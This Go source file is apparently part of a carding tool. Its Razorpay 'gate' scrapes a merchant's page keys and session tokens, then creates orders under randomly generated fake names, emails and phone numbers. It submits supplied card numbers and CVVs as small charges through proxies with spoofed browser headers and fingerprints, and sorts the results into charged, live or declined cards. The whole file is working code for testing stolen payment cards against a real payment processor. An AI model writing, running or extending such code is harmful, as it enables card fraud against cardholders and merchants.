package main

import (
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"regexp"
	"strings"
	"sync"
	"time"
)

// ─────────────── Constants ───────────────────────────────────────────

const (
	razorpayGatewayName = "Razorpay"
	razorpayUserAgent   = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
)

// razorpayMerchantSite defines a merchant page to try.
// To add more sites in the future, just add entries to this slice.
type razorpayMerchantSite struct {
	URL         string // page URL
	Origin      string // Origin header for API calls
	AmountPaise int    // charge amount in paise
}

var razorpayMerchantSites = []razorpayMerchantSite{
	// pages.razorpay.com sites — confirmed working (HTTP-only, no browser)
	{"https://pages.razorpay.com/10DUM", "https://pages.razorpay.com", 1000}, // ₹10, Entri
}

// ─────────────── Cache: session token + merchant data ────────────────

var (
	cachedSessionToken   string
	cachedSessionTokenAt time.Time
	sessionTokenMu       sync.Mutex

	cachedMerchantData   *razorpayMerchantData
	cachedMerchantDataAt time.Time
	merchantDataMu       sync.Mutex

	cacheTTL = 5 * time.Minute
)

func getCachedSessionToken(proxyURL string) (string, error) {
	sessionTokenMu.Lock()
	if cachedSessionToken != "" && time.Since(cachedSessionTokenAt) < cacheTTL {
		t := cachedSessionToken
		sessionTokenMu.Unlock()
		return t, nil
	}
	sessionTokenMu.Unlock()

	token, err := fetchSessionToken(proxyURL)
	if err != nil {
		return "", err
	}

	sessionTokenMu.Lock()
	cachedSessionToken = token
	cachedSessionTokenAt = time.Now()
	sessionTokenMu.Unlock()
	return token, nil
}

func getCachedMerchantData(proxyURL string) (*razorpayMerchantData, error) {
	merchantDataMu.Lock()
	if cachedMerchantData != nil && time.Since(cachedMerchantDataAt) < cacheTTL {
		md := cachedMerchantData
		merchantDataMu.Unlock()
		return md, nil
	}
	merchantDataMu.Unlock()

	site := razorpayMerchantSites[0]
	md, err := fetchMerchantData(site.URL, site.Origin, site.AmountPaise, proxyURL)
	if err != nil {
		return nil, err
	}

	merchantDataMu.Lock()
	cachedMerchantData = md
	cachedMerchantDataAt = time.Now()
	merchantDataMu.Unlock()
	return md, nil
}

// ─────────────── Merchant data ──────────────────────────────────────

type razorpayMerchantData struct {
	KeyID           string
	KeylessHeader   string
	PaymentLinkID   string
	PaymentPageItem string
	SiteURL         string
	Origin          string
	AmountPaise     int
}

// fetchMerchantData fetches the razorpay page HTML and extracts merchant
// credentials from the `var data = {...}` JSON blob embedded in the page.
func fetchMerchantData(siteURL, origin string, amountPaise int, proxyURL string) (*razorpayMerchantData, error) {
	client := newHTTPClient(proxyURL, 20*time.Second)

	req, err := http.NewRequest("GET", siteURL, nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", razorpayUserAgent)
	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
	req.Header.Set("Accept-Language", "en-US,en;q=0.9")
	req.Header.Set("Sec-Fetch-Dest", "document")
	req.Header.Set("Sec-Fetch-Mode", "navigate")
	req.Header.Set("Sec-Fetch-Site", "none")
	req.Header.Set("Upgrade-Insecure-Requests", "1")

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("page fetch: %w", err)
	}
	defer resp.Body.Close()
	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read body: %w", err)
	}
	if resp.StatusCode != 200 {
		return nil, fmt.Errorf("page HTTP %d", resp.StatusCode)
	}

	htmlStr := string(body)

	// Parse `var data = {...};`
	dataRe := regexp.MustCompile(`var\s+data\s*=\s*(\{.*?\});`)
	m := dataRe.FindStringSubmatch(htmlStr)
	if len(m) != 2 {
		return nil, fmt.Errorf("var data not found in page HTML")
	}

	var pageData map[string]interface{}
	if err := json.Unmarshal([]byte(m[1]), &pageData); err != nil {
		return nil, fmt.Errorf("parse var data: %w", err)
	}

	keyID, _ := pageData["key_id"].(string)
	kh, _ := pageData["keyless_header"].(string)
	if keyID == "" || kh == "" {
		return nil, fmt.Errorf("key_id or keyless_header missing from page data")
	}

	pl, _ := pageData["payment_link"].(map[string]interface{})
	if pl == nil {
		return nil, fmt.Errorf("payment_link missing from page data")
	}
	plid, _ := pl["id"].(string)
	if plid == "" {
		return nil, fmt.Errorf("payment_link.id missing")
	}

	items, _ := pl["payment_page_items"].([]interface{})
	if len(items) == 0 {
		return nil, fmt.Errorf("payment_page_items empty")
	}
	item, _ := items[0].(map[string]interface{})
	ppi, _ := item["id"].(string)
	if ppi == "" {
		return nil, fmt.Errorf("payment_page_item.id missing")
	}

	// Try to extract actual amount from the item
	extractedAmount := amountPaise
	if amt, ok := item["amount"].(float64); ok && amt > 0 {
		extractedAmount = int(amt)
	}
	if ua, ok := item["unit_amount"].(float64); ok && ua > 0 {
		extractedAmount = int(ua)
	}
	// If amount is null (flexible), use the configured amount
	if extractedAmount == 0 {
		extractedAmount = amountPaise
	}

	return &razorpayMerchantData{
		KeyID:           keyID,
		KeylessHeader:   kh,
		PaymentLinkID:   plid,
		PaymentPageItem: ppi,
		SiteURL:         siteURL,
		Origin:          origin,
		AmountPaise:     extractedAmount,
	}, nil
}

// ─────────────── Session token ──────────────────────────────────────

var sessionTokenRe = regexp.MustCompile(`session_token[="\s:]+([a-zA-Z0-9_-]{20,})`)

func fetchSessionToken(proxyURL string) (string, error) {
	token, err := fetchSessionTokenViaProxy(proxyURL)
	if err == nil {
		return token, nil
	}

	if proxyURL != "" {
		token2, err2 := fetchSessionTokenViaProxy("")
		if err2 == nil {
			return token2, nil
		}
	}

	return "", err
}

func fetchSessionTokenViaProxy(proxyURL string) (string, error) {
	client := newHTTPClient(proxyURL, 15*time.Second)

	checkoutURLs := []string{
		"https://api.razorpay.com/v1/checkout/public?traffic_env=production&new_session=1",
		"https://api.razorpay.com/v1/checkout/public?new_session=true",
		"https://api.razorpay.com/v1/checkout/public?traffic_env=production",
	}

	for _, u := range checkoutURLs {
		req, err := http.NewRequest("GET", u, nil)
		if err != nil {
			continue
		}
		req.Header.Set("User-Agent", razorpayUserAgent)
		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
		req.Header.Set("Sec-Fetch-Dest", "document")
		req.Header.Set("Sec-Fetch-Mode", "navigate")
		req.Header.Set("Sec-Fetch-Site", "none")
		req.Header.Set("Sec-Fetch-User", "?1")
		req.Header.Set("Upgrade-Insecure-Requests", "1")

		resp, err := client.Do(req)
		if err != nil {
			fmt.Printf("[RAZ] session_token url=%s err=%v proxy=%s\n", u, err, proxyURL)
			continue
		}

		finalURL := resp.Request.URL.String()
		if token := extractTokenFromURL(finalURL); token != "" {
			resp.Body.Close()
			return token, nil
		}

		if loc := resp.Header.Get("Location"); loc != "" {
			if token := extractTokenFromURL(loc); token != "" {
				resp.Body.Close()
				return token, nil
			}
		}

		body, _ := io.ReadAll(resp.Body)
		resp.Body.Close()

		if m := sessionTokenRe.FindStringSubmatch(string(body)); len(m) == 2 {
			return m[1], nil
		}

		var jsonResp map[string]interface{}
		if json.Unmarshal(body, &jsonResp) == nil {
			if token, ok := jsonResp["session_token"].(string); ok && len(token) > 10 {
				return token, nil
			}
		}

		fmt.Printf("[RAZ] session_token url=%s status=%d body_len=%d no_token_found\n", u, resp.StatusCode, len(body))
	}

	return "", fmt.Errorf("all token methods failed")
}

func extractTokenFromURL(rawURL string) string {
	if rawURL == "" {
		return ""
	}
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return ""
	}
	token := parsed.Query().Get("session_token")
	if len(token) > 10 {
		return token
	}
	return ""
}

// ─────────────── API calls ──────────────────────────────────────────

// createOrder POSTs to /v1/payment_pages/{plid}/order and returns the order_id.
func createOrder(client *http.Client, md *razorpayMerchantData) (string, error) {
	endpoint := fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", md.PaymentLinkID)

	name := randomFirstName() + " " + randomLastName()
	nameParts := strings.SplitN(name, " ", 2)
	email := randomEmail(nameParts[0], nameParts[1])
	phone := fmt.Sprintf("+91%d", 9000000000+rand.Intn(999999999))

	payload, _ := json.Marshal(map[string]interface{}{
		"line_items": []map[string]interface{}{
			{"payment_page_item_id": md.PaymentPageItem, "amount": md.AmountPaise},
		},
		"notes": map[string]string{
			"name":  name,
			"email": email,
			"phone": phone,
		},
	})

	req, err := http.NewRequest("POST", endpoint, strings.NewReader(string(payload)))
	if err != nil {
		return "", err
	}
	req.Header.Set("Accept", "application/json")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("User-Agent", razorpayUserAgent)
	req.Header.Set("Origin", md.Origin)
	req.Header.Set("Referer", md.Origin+"/")
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-site")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	if resp.StatusCode == 400 || resp.StatusCode == 401 || resp.StatusCode == 403 {
		fmt.Printf("[RAZ] step=create_order status=%d body=%s\n", resp.StatusCode, string(body))
		return "", fmt.Errorf("API_ERROR_%d", resp.StatusCode)
	}
	if resp.StatusCode == 404 {
		return "", fmt.Errorf("API_ERROR_404")
	}
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("order HTTP %d", resp.StatusCode)
	}

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return "", fmt.Errorf("order parse: %w", err)
	}
	if order, ok := result["order"].(map[string]interface{}); ok {
		if id, ok := order["id"].(string); ok && id != "" {
			return id, nil
		}
	}
	if id, ok := result["id"].(string); ok && id != "" {
		return id, nil
	}
	return "", fmt.Errorf("order_id not found")
}

// submitPayment POSTs card details to /v1/standard_checkout/payments/create/ajax.
func submitPayment(client *http.Client, md *razorpayMerchantData, sessionToken, orderID, cc, mm, yy, cvv string) (map[string]interface{}, error) {
	apiURL := "https://api.razorpay.com/v1/standard_checkout/payments/create/ajax"

	params := url.Values{}
	params.Set("key_id", md.KeyID)
	params.Set("session_token", sessionToken)
	params.Set("keyless_header", md.KeylessHeader)

	name := randomFirstName() + " " + randomLastName()
	nameParts := strings.SplitN(name, " ", 2)
	email := randomEmail(nameParts[0], nameParts[1])
	phone := fmt.Sprintf("+91%d", 9000000000+rand.Intn(999999999))

	form := url.Values{}
	form.Set("notes[comment]", "")
	form.Set("payment_link_id", md.PaymentLinkID)
	form.Set("key_id", md.KeyID)
	form.Set("contact", phone)
	form.Set("email", email)
	form.Set("currency", "INR")
	form.Set("_[library]", "checkoutjs")
	form.Set("_[platform]", "browser")
	form.Set("_[referer]", md.SiteURL)
	form.Set("amount", fmt.Sprintf("%d", md.AmountPaise))
	form.Set("order_id", orderID)
	form.Set("device_fingerprint[fingerprint_payload]", randomFingerprint(128))
	form.Set("method", "card")
	form.Set("card[number]", cc)
	form.Set("card[cvv]", cvv)
	form.Set("card[name]", name)
	form.Set("card[expiry_month]", stripeMMPad(mm))
	form.Set("card[expiry_year]", stripeFullYear(yy))
	form.Set("save", "0")

	req, err := http.NewRequest("POST", apiURL+"?"+params.Encode(), strings.NewReader(form.Encode()))
	if err != nil {
		return nil, err
	}
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", razorpayUserAgent)
	req.Header.Set("x-session-token", sessionToken)
	req.Header.Set("Origin", md.Origin)
	req.Header.Set("Referer", md.SiteURL)
	req.Header.Set("Sec-Fetch-Dest", "empty")
	req.Header.Set("Sec-Fetch-Mode", "cors")
	req.Header.Set("Sec-Fetch-Site", "same-site")

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var result map[string]interface{}
	if err := json.Unmarshal(body, &result); err != nil {
		return nil, fmt.Errorf("payment parse: %w (body: %s)", err, string(body))
	}
	return result, nil
}

func checkPaymentStatus(client *http.Client, md *razorpayMerchantData, sessionToken, paymentID string) (string, map[string]interface{}) {
	apiURL := fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s", paymentID)

	params := url.Values{}
	params.Set("key_id", md.KeyID)
	params.Set("session_token", sessionToken)
	params.Set("keyless_header", md.KeylessHeader)

	req, err := http.NewRequest("GET", apiURL+"?"+params.Encode(), nil)
	if err != nil {
		return "unknown", nil
	}
	req.Header.Set("Accept", "*/*")
	req.Header.Set("User-Agent", razorpayUserAgent)
	req.Header.Set("x-session-token", sessionToken)
	req.Header.Set("Origin", "https://razorpay.com")

	resp, err := client.Do(req)
	if err != nil {
		return "unknown", nil
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var result map[string]interface{}
	if json.Unmarshal(body, &result) != nil {
		return "unknown", nil
	}
	status, _ := result["status"].(string)
	if status == "" {
		status = "unknown"
	}
	return status, result
}

func cancelPayment(client *http.Client, md *razorpayMerchantData, sessionToken, paymentID string) map[string]interface{} {
	apiURL := fmt.Sprintf("https://api.razorpay.com/v1/standard_checkout/payments/%s/cancel", paymentID)

	params := url.Values{}
	params.Set("key_id", md.KeyID)
	params.Set("session_token", sessionToken)
	params.Set("keyless_header", md.KeylessHeader)

	req, err := http.NewRequest("GET", apiURL+"?"+params.Encode(), nil)
	if err != nil {
		return map[string]interface{}{"error": map[string]string{"description": "cancel request error", "reason": "network_error"}}
	}
	req.Header.Set("Accept", "*/*")
	req.Header.Set("User-Agent", razorpayUserAgent)
	req.Header.Set("x-session-token", sessionToken)
	req.Header.Set("Origin", "https://razorpay.com")

	resp, err := client.Do(req)
	if err != nil {
		return map[string]interface{}{"error": map[string]string{"description": "cancel network error", "reason": "network_error"}}
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)

	var result map[string]interface{}
	if json.Unmarshal(body, &result) != nil {
		return map[string]interface{}{"error": map[string]string{"description": fmt.Sprintf("Cancel HTTP %d", resp.StatusCode), "reason": "http_error"}}
	}
	return result
}

// ─────────────── Helpers ────────────────────────────────────────────

func randomFingerprint(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func determineTagFromCancel(cancelData map[string]interface{}) (string, string) {
	if cancelData == nil {
		return "UNKNOWN", "unknown"
	}
	if isPgRouterResponse(cancelData) {
		return "DECLINED", "authentication_failed"
	}
	errObj, ok := cancelData["error"].(map[string]interface{})
	if !ok {
		// If there's no error object, it might be a success response
		if _, ok := cancelData["status"]; ok {
			return "LIVE", "payment_cancelled"
		}
		return "UNKNOWN", "unknown"
	}
	reason, _ := errObj["reason"].(string)
	desc, _ := errObj["description"].(string)

	if reason == "payment_cancelled" {
		return "LIVE", "payment_cancelled"
	}

	declineReasons := map[string]bool{
		"invalid_card": true, "card_declined": true, "expired_card": true,
		"incorrect_pin": true, "insufficient_funds": true, "processing_error": true,
		"invalid_cvv": true, "bank_technical_error": true, "gateway_error": true,
		"bad_request": true, "authentication_failed": true, "timeout": true,
		"do_not_honour": true, "card_not_enrolled": true,
	}
	if declineReasons[reason] {
		return "DECLINED", reason
	}

	declineKeywords := []string{"declined", "invalid", "expired", "blocked", "restricted", "do not honour", "temporary issue", "didn't go through", "not enabled", "not enrolled"}
	descLower := strings.ToLower(desc)
	for _, kw := range declineKeywords {
		if strings.Contains(descLower, kw) {
			return "DECLINED", reason
		}
	}
	if strings.Contains(descLower, "cancelled") {
		return "LIVE", "payment_cancelled"
	}
	return "LIVE", "unknown_live"
}

func isPgRouterResponse(data map[string]interface{}) bool {
	if data == nil {
		return false
	}
	amount, _ := data["amount"].(string)
	notifURL, _ := data["notificationUrl"].(string)
	if amount == "" || notifURL == "" {
		return false
	}
	hasRupee := strings.Contains(amount, "\u20b9") || strings.Contains(amount, "₹")
	hasPgRouter := strings.Contains(notifURL, "pg_router/v1/payments")
	return hasRupee && hasPgRouter
}

func formatAmountPaise(paise int) string {
	return fmt.Sprintf("%.2f", float64(paise)/100.0)
}

// ─────────────── Gate: Razorpay — /raz ──────────────────────────────

func checkRazorpayCard(cc, mm, yy, cvv, proxyURL string) *CheckResult {
	card := cc + "|" + mm + "|" + yy + "|" + cvv

	fail := func(code string) *CheckResult {
		return &CheckResult{
			Card:       card,
			Status:     StatusError,
			StatusCode: code,
			Gateway:    razorpayGatewayName,
			Retryable:  true,
		}
	}

	// Step 1: Get cached session token
	sessionToken, err := getCachedSessionToken(proxyURL)
	if err != nil {
		fmt.Printf("[RAZ] card=%s step=session_token err=%v\n", card, err)
		return fail("SESSION_TOKEN_FAIL")
	}

	// Step 2: Get cached merchant data
	md, err := getCachedMerchantData(proxyURL)
	if err != nil {
		fmt.Printf("[RAZ] card=%s step=merchant_data err=%v\n", card, err)
		return fail("ALL_SITES_FAILED")
	}

	// Step 3: Create order + process payment
	client := newCookieClient(proxyURL, 30*time.Second)
	orderID, err := createOrder(client, md)
	if orderID == "" {
		fmt.Printf("[RAZ] card=%s step=create_order failed err=%v\n", card, err)
		return fail("ALL_SITES_FAILED")
	}

	return processRazorpayPayment(card, cc, mm, yy, cvv, md, sessionToken, orderID, client, proxyURL)
}

func processRazorpayPayment(card, cc, mm, yy, cvv string, md *razorpayMerchantData, sessionToken, orderID string, client *http.Client, proxyURL string) *CheckResult {
	fail := func(code string) *CheckResult {
		return &CheckResult{
			Card:       card,
			Status:     StatusError,
			StatusCode: code,
			Gateway:    razorpayGatewayName,
			Retryable:  true,
		}
	}

	amtStr := formatAmountPaise(md.AmountPaise)

	time.Sleep(time.Duration(300+rand.Intn(500)) * time.Millisecond)

	// Step 3: Submit payment
	pdata, err := submitPayment(client, md, sessionToken, orderID, cc, mm, yy, cvv)
	if err != nil {
		fmt.Printf("[RAZ] card=%s step=submit_payment err=%v\n", card, err)
		return fail("PAYMENT_SUBMIT_FAIL")
	}
	if pdata == nil {
		fmt.Printf("[RAZ] card=%s step=submit_payment err=nil_response\n", card)
		return fail("PAYMENT_PARSE_FAIL")
	}

	// Check for direct signature (non-3DS success)
	if _, ok := pdata["razorpay_signature"]; ok {
		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
	}
	if _, ok := pdata["signature"]; ok {
		return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
	}

	// Check for pg_router response (auth flow)
	if isPgRouterResponse(pdata) {
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "DECLINED > AUTHENTICATION_FAILED", Gateway: razorpayGatewayName}
	}

	// Check for error in response
	if errObj, ok := pdata["error"].(map[string]interface{}); ok {
		desc, _ := errObj["description"].(string)
		reason, _ := errObj["reason"].(string)
		if reason == "" {
			reason, _ = errObj["code"].(string)
		}
		if desc == "" {
			desc = "Unknown error"
		}
		desc = strings.ReplaceAll(desc, "%s", "Card")

		if reason == "insufficient_funds" || reason == "authentication_required" {
			return &CheckResult{Card: card, Status: StatusApproved, StatusCode: strings.ToUpper(reason), Gateway: razorpayGatewayName}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "DECLINED > " + strings.ToUpper(reason), Gateway: razorpayGatewayName}
	}

	// Extract payment_id
	paymentID, _ := pdata["payment_id"].(string)
	if paymentID == "" {
		if rzpPID, ok := pdata["razorpay_payment_id"].(string); ok {
			paymentID = rzpPID
		}
	}
	if paymentID == "" {
		if payObj, ok := pdata["payment"].(map[string]interface{}); ok {
			if id, ok := payObj["id"].(string); ok {
				paymentID = id
			}
		}
	}

	// Check for 3DS redirect
	isRedirect := false
	if r, ok := pdata["redirect"].(bool); ok && r {
		isRedirect = true
	}
	if t, ok := pdata["type"].(string); ok && t == "redirect" {
		isRedirect = true
	}

	if !isRedirect || paymentID == "" {
		rawJSON, _ := json.Marshal(pdata)
		fmt.Printf("[RAZ] card=%s step=unknown_response body=%s\n", card, string(rawJSON))
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "UNKNOWN_RESPONSE", Gateway: razorpayGatewayName}
	}

	// Extract the redirect URL from the response
	redirectURL := ""
	if reqObj, ok := pdata["request"].(map[string]interface{}); ok {
		redirectURL, _ = reqObj["url"].(string)
	}
	if redirectURL == "" {
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "REDIRECT_URL_MISSING", Gateway: razorpayGatewayName}
	}

	// ── 3DS redirect path (browser-based) ──
	// Run solver and cancel in parallel. Whichever gives a definitive
	// answer first wins. Most declined cards get the cancel result in
	// ~2s without waiting for the full 8-10s solver cycle.
	fmt.Printf("[RAZ] card=%s step=3ds_browser redirect_url=%s\n", card, redirectURL)

	type solverOutcome struct {
		result *razorpay3DSResult
	}
	type cancelOutcome struct {
		data map[string]interface{}
	}

	solverCh := make(chan solverOutcome, 1)
	cancelCh := make(chan cancelOutcome, 1)

	go func() {
		solverCh <- solverOutcome{result: handle3DSRedirect(redirectURL, proxyURL)}
	}()
	go func() {
		cancelCh <- cancelOutcome{data: cancelPayment(client, md, sessionToken, paymentID)}
	}()

	// Wait for either solver or cancel to give a definitive answer
	for {
		select {
		case so := <-solverCh:
			if so.result != nil && so.result.Charged {
				fmt.Printf("[RAZ] card=%s step=3ds_result CHARGED (frictionless)\n", card)
				return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
			}
			// Solver not charged — wait for cancel
			co := <-cancelCh
			rawCancel, _ := json.Marshal(co.data)
			fmt.Printf("[RAZ] card=%s step=cancel response=%s\n", card, string(rawCancel))
			tag, reason := determineTagFromCancel(co.data)
			return buildCancelResult(card, amtStr, tag, reason)

		case co := <-cancelCh:
			rawCancel, _ := json.Marshal(co.data)
			fmt.Printf("[RAZ] card=%s step=cancel response=%s\n", card, string(rawCancel))
			tag, reason := determineTagFromCancel(co.data)
			// If cancel gives a definitive DECLINED, return immediately
			if tag == "DECLINED" {
				return buildCancelResult(card, amtStr, tag, reason)
			}
			// Otherwise wait for solver to check if charged
			so := <-solverCh
			if so.result != nil && so.result.Charged {
				fmt.Printf("[RAZ] card=%s step=3ds_result CHARGED (frictionless)\n", card)
				return &CheckResult{Card: card, Status: StatusCharged, StatusCode: "PAYMENT_SUCCEEDED", Amount: amtStr, Currency: "INR", Gateway: razorpayGatewayName}
			}
			return buildCancelResult(card, amtStr, tag, reason)
		}
	}
}

func buildCancelResult(card, amtStr, tag, reason string) *CheckResult {
	switch tag {
	case "LIVE":
		return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "3DS_REQUIRED", Gateway: razorpayGatewayName}
	case "DECLINED":
		if reason == "insufficient_funds" {
			return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "INSUFFICIENT_FUNDS", Gateway: razorpayGatewayName}
		}
		return &CheckResult{Card: card, Status: StatusDeclined, StatusCode: "DECLINED > " + strings.ToUpper(reason), Gateway: razorpayGatewayName}
	default:
		return &CheckResult{Card: card, Status: StatusApproved, StatusCode: "3DS_REQUIRED", Gateway: razorpayGatewayName}
	}
}
